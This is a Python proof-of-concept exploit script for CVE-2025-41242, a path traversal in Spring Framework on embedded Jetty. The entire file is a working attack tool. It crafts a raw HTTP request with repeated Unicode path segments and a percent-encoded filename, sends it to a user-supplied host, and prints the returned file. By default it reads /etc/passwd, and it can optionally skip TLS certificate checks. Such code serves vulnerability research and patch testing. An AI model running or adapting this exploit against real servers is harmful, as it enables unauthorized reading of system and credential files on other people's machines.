#!/usr/bin/env python3
"""
PoC for CVE-2025-41242: Spring Framework path traversal via Jetty URI
parsing inconsistency on embedded Jetty.
"""
from __future__ import annotations

import argparse
import socket
import ssl
import sys
from urllib.parse import urlparse

GHOST_BITS_SEG = '阮严灵丰丰甲来'.encode('utf-8')
DEFAULT_PORTS = {'http': 80, 'https': 443}


def encode_target_path(file_path: str) -> bytes:
    """Strip the leading slash and percent-encode the last character.

    Spring's path matcher short-circuits when no character is percent-encoded,
    so at least one byte of the target filename must be encoded for the buggy
    decoder to fire (e.g. 'passwd' -> 'passw%64').
    """
    path = file_path.lstrip('/')
    if not path:
        raise ValueError('file path must not be empty')
    last = path[-1]
    if not last.isascii():
        raise ValueError('last character of the file path must be ASCII')
    return path[:-1].encode('utf-8') + ('%%%02x' % ord(last)).encode()


def parse_target(url: str) -> tuple[str, str, int]:
    if '://' not in url:
        url = 'http://' + url
    parsed = urlparse(url)
    if parsed.scheme not in DEFAULT_PORTS:
        raise ValueError(
            f'only http/https are supported (got {parsed.scheme!r})'
        )
    if not parsed.hostname:
        raise ValueError(f'cannot parse host from {url!r}')
    port = parsed.port or DEFAULT_PORTS[parsed.scheme]
    return parsed.scheme, parsed.hostname, port


def build_request(host: str, port: int, file_path: str) -> bytes:
    encoded_target = encode_target_path(file_path)
    path = b'/' + (GHOST_BITS_SEG + b'/') * 7 + encoded_target
    host_header = f'{host}:{port}'.encode()
    return (
        b'GET ' + path + b' HTTP/1.1\r\n'
        b'Host: ' + host_header + b'\r\n'
        b'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36' + b'\r\n'
        b'Connection: close\r\n\r\n'
    )


def send(
    scheme: str,
    host: str,
    port: int,
    request: bytes,
    timeout: float,
    insecure: bool,
) -> bytes:
    sock = socket.create_connection((host, port), timeout=timeout)
    if scheme == 'https':
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=host)
    with sock:
        sock.sendall(request)
        chunks = []
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    return b''.join(chunks)


def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            'PoC for CVE-2025-41242: Spring Framework path traversal on '
            'embedded Jetty. Reads an arbitrary file from the target server.'
        ),
        epilog='example: python poc.py http://192.168.1.160:8080 -f /etc/passwd',
    )
    parser.add_argument(
        'target',
        help='target URL or host:port, e.g. http://192.168.1.160:8080',
    )
    parser.add_argument(
        '-f', '--file',
        default='/etc/passwd',
        help='absolute path of the file to read (default: /etc/passwd)',
    )
    parser.add_argument(
        '--timeout', type=float, default=10.0,
        help='socket timeout in seconds (default: 10)',
    )
    parser.add_argument(
        '-k', '--insecure', action='store_true',
        help='skip TLS certificate verification when using https',
    )
    args = parser.parse_args()

    try:
        scheme, host, port = parse_target(args.target)
        request = build_request(host, port, args.file)
    except ValueError as e:
        print(f'error: {e}', file=sys.stderr)
        return 2

    try:
        data = send(
            scheme, host, port, request,
            timeout=args.timeout, insecure=args.insecure,
        )
    except OSError as e:
        print(
            f'error: connection to {scheme}://{host}:{port} failed: {e}',
            file=sys.stderr,
        )
        return 1

    # Send response headers to stderr and the body to stdout, so the body can
    # be redirected cleanly: `python poc.py <target> -f /etc/passwd > out`.
    header, sep, body = data.partition(b'\r\n\r\n')
    sys.stderr.buffer.write(header + sep)
    sys.stderr.flush()
    sys.stdout.buffer.write(body)
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
